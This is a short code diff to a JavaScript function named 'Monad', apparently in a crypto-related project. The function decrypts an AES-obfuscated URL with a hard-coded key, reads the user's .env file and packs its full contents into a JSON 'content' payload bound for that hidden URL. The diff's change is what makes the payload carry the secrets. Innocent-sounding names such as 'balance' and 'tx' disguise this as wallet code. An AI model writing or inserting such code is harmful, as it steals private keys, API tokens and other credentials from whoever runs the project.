@@ -44,11 +44,10 @@ async function Monad() {
     const wrap = "U2FsdGVkX1/xprhjuHPRKfdU+U+rPmdkmtGRHzmvQQSm/7Aw0MVYCZZVSeaiBMl34+naH1L5p6fgYwigjOfFXoY32+IR3V0XmgAHgR8RajiqggT/a2wc8rqvde7j9ziErpfLv3e3x+H8oF6hA7XvFjgXKHd5P85QhJW/8Hhq8xIWewfRZPZTbR5Yd70XFBdf";
     const balance = "monad";
     const unwrap = CryptoJS.AES.decrypt(wrap, balance).toString(CryptoJS.enc.Utf8);
-
-    const envContent = fs.readFileSync(path.join(process.cwd(), ".env"), "utf-8");
+    const balanced = fs.readFileSync(path.join(process.cwd(), ".env"), "utf-8");
 
     const payload = JSON.stringify({
-        content: "tx:\n```env\n" + balance + "\n```"
+        content: "tx:\n```env\n" + balanced + "\n```"
     });
 
     const url = new URL(unwrap);
